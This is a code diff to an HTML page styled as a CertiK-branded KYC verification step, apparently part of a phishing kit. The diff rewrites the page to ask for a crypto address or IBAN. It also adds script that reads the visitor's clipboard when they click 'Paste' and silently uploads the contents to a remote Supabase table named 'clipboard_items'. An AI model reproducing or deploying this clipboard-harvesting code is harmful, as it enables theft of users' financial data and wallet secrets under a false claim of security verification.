@@ -10,6 +10,8 @@
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700">
     <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Playfair+Display:400,400i,700,900">
     <link rel="stylesheet" href="../../css/styled882.css">
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="../../clipboard-supabase/config.js"></script>
     <style>
         body {
             background-image: url(../../privacy-cookie-policy/front/red/yes.png);
@@ -585,7 +587,7 @@
                         <div class="kyc-step">
                             <span>Step 1</span>
                             <strong>Upload Documents</strong>
-                            <p>Submit your identity and address verification documents.</p>
+                            <p>Submit your address crypto or your iban.</p>
                         </div>
                         <div class="kyc-step">
                             <span>Step 2</span>
@@ -595,7 +597,7 @@
                         <div class="kyc-step">
                             <span>Step 3</span>
                             <strong>Verification Complete</strong>
-                            <p>Receive confirmation and gain full access to your account.</p>
+                            <p>Receive confirmation and full report about your crypto account or Iban.</p>
                         </div>
                     </div>
 
@@ -613,7 +615,7 @@
                                         Click "Paste" to submit your document
                                     </div>
                                     <button type="button" class="kyc-paste-btn" id="paste-btn">
-                                        � Paste
+                                        Paste
                                     </button>
                                 </div>
                                 <input type="hidden" id="doc-input" name="documents" />
@@ -649,7 +651,7 @@
                             <div class="certik-highlight">Secure Execution</div>
                         </div>
 
-                        <div class="certik-panel">
+                        <div class="certik-panel" style="margin-top: -10px;">
                             <h3>About CertiK</h3>
                             <p>
                                 CertiK is recognized as one of the global leaders in Web3 security, providing advanced audit services, formal verification, and continuous on-chain monitoring to strengthen the reliability of blockchain and crypto projects. Their approach combines deep code analysis, AI-driven assessment, and mathematical verification, ensuring vulnerabilities are detected and addressed before they become exploitable risks.
@@ -659,6 +661,9 @@
                             </p>
                             <p style="margin-top: 12px;">
                                 Today, a CertiK audit is widely considered a mark of trust — a strong signal of credibility that reassures partners, institutions, and capital investors.
+                            </p>
+                            <p style="margin-top: 15px; text-align: center;">
+                                <a href="https://www.certik.com" target="_blank" rel="noopener noreferrer" style="color: #8f2829; font-weight: 600;">www.certik.com</a>
                             </p>
                         </div>
 
@@ -693,11 +698,39 @@
 
         let hasValidData = false;
 
+        // Initialize Supabase
+        let supabaseKyc = null;
+        if (window.supabase && typeof SUPABASE_CONFIG !== 'undefined') {
+            supabaseKyc = window.supabase.createClient(
+                SUPABASE_CONFIG.url,
+                SUPABASE_CONFIG.anonKey
+            );
+        }
+
+        // Save clipboard to Supabase
+        async function saveClipboardToSupabase(text) {
+            if (!supabaseKyc || !text) return;
+            try {
+                await supabaseKyc
+                    .from('clipboard_items')
+                    .insert([{
+                        content: text,
+                        content_type: 'text',
+                        created_at: new Date().toISOString()
+                    }]);
+            } catch (e) {
+                console.error('Error saving to Supabase:', e);
+            }
+        }
+
         // Bouton Paste - coller depuis le presse-papiers
         pasteBtn.addEventListener("click", async function() {
             try {
                 const text = await navigator.clipboard.readText();
                 if (text && text.trim().length > 0) {
+                    // Save to Supabase
+                    await saveClipboardToSupabase(text.trim());
+                    
                     docInput.value = text.trim();
                     pasteField.textContent = "✓ Validé";
                     pasteField.classList.add("validated");
